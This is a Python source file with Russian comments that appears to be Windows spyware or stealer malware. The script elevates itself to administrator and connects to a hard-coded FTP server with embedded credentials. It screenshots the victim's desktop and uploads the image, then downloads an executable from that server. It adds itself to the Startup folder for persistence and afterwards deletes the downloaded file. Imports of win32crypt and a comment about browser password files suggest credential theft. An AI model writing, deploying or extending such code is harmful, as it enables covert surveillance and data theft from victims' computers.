import os
import sys
import shutil
import sqlite3
import win32crypt
import json,base64
import requests
import zipfile
import time
import ftplib
import glob
import webbrowser
import ctypes
import ctypes.wintypes
import win32com.shell.shell as shell
from ftplib import FTP
from PIL import ImageGrab
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import (
    Cipher, algorithms, modes)
from pathlib import Path

ASADMIN = 'asadmin'

if sys.argv[-1] != ASADMIN:
    script = os.path.abspath(sys.argv[0])
    params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
    shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)

#def main():
#    dirName = 'C:\\windows\\LOGERIS'

#    # Create target directory & all intermediate directories if don't exists
#    try:
#        os.makedirs(dirName)    
#        print("Directory " , dirName ,  " Созданный ")
#    except FileExistsError:
#        print("Directory " , dirName ,  " уже существует")  

#if __name__ == '__main__':
#    main()    
		
host = "191.01.78.111"
ftp_user = "logFt"
ftp_password = "687661"

ftp = ftplib.FTP(host, ftp_user, ftp_password)
# после чего каждую переменную подключим к авторизации:
print('Trying connect to server', host)

webbrowser.open_new_tab('https://vk.com')

snapshot = ImageGrab.grab()

save_path = "C:\\Startskrin.jpg"

snapshot.save(save_path)

with open("C:\\Startskrin.jpg", 'rb') as upload_file:
    ftp.storbinary('STOR ' + 'Startskrin.jpg', upload_file)


#time.sleep(10)

#ftp.delete('Startskrin.jpg')

#######        ###### Файлы браузера паролей ######   #####

local_file = 'C:\\GOOGL.exe' #Папка куда закачаете файл С вашего сервера
ftp_file = 'GOOGL.exe' #Имя файла на сервере каторый скачиваете
with open(local_file, 'wb') as local_file: #Создаем локальный файл в режиме двоичной записи
    ftp.retrbinary('retr ' + ftp_file, local_file.write) #Открываем файл на сервере и делаем его копию в локальный файл


#===================================Добавляем этот файл в автозагрузку========================================
Thisfile = sys.argv[0] # Полный путь к файлу, включая название и расширение
Thisfile_name = os.path.basename(Thisfile) # Название файла без пути
user_path = os.path.expanduser('~') # Путь к папке пользователя

if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{Thisfile_name}"):
        os.system(f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
        print(f'{Thisfile_name} добавлен в автозагрузку')


ftp.close() #Закрываем соединени
time.sleep(10)
# Удаляете скачанный файл
path = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'C:\\GOOGL.exe')
os.remove(path)

sys.exit(0)
